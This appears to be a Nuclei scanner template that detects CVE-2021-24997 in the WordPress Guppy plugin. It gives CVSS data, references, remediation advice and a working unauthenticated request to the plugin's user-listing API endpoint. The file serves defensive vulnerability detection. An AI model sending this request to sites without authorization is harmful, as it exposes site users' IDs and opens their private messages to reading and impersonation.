id: CVE-2021-24997

info:
  name: WordPress Guppy <=1.1 - Information Disclosure
  author: Evan Rubinstein
  severity: medium
  description: WordPress Guppy plugin through 1.1 is susceptible to an API disclosure vulnerability. This can allow an attacker to obtain all user IDs and then use them to make API requests to get messages sent between users and/or send messages posing as one user to another.
  impact: |
    An attacker can exploit this vulnerability to gain sensitive information from the target system.
  remediation: |
    Update to the latest version of the WordPress Guppy plugin (version >1.1) to mitigate the information disclosure vulnerability.
  reference:
    - https://www.exploit-db.com/exploits/50540
    - https://patchstack.com/database/vulnerability/wp-guppy/wordpress-wp-guppy-plugin-1-2-sensitive-information-disclosure-vulnerability
    - https://wpscan.com/vulnerability/747e6c7e-a167-4d82-b6e6-9e8613f0e900
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24997
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 6.5
    cve-id: CVE-2021-24997
    cwe-id: CWE-862
    epss-score: 0.04579
    epss-percentile: 0.88864
    cpe: cpe:2.3:a:wp-guppy:wp_guppy:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 1
    vendor: wp-guppy
    product: wp_guppy
    framework: wordpress
  tags: cve,cve2021,wordpress,guppy,api,wp-plugin,edb,wpscan,wp-guppy

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-json/guppy/v2/load-guppy-users?userId=1&offset=0&search="

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"guppyUsers":'
          - '"userId":'
          - '"type":'
        condition: and

      - type: status
        status:
          - 200
# digest: 4a0a00473045022051accf821a69fa726329ec089d21c240ade5be277821b5806c2c45a3c69e227e02210098ee53f4b7489f2bff7e28e492b41b20fb1323032b9cb71a9802b537b0c324bf:922c64590222798bb761d5b6d8e72950